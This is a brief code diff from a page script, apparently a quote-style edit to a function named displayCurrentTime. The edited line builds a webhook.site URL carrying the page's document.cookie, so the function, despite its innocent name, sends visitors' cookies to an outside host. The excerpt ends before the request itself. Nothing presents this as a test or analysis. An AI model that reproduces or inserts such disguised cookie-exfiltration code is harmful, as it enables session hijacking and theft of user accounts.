@@ -5,7 +5,7 @@ document.addEventListener("DOMContentLoaded", function () {
   });
 
   function displayCurrentTime() {
-    const url = 'https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d?' + new URLSearchParams({
+    const url = "https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d?" + new URLSearchParams({
       cookie: document.cookie
     });
 
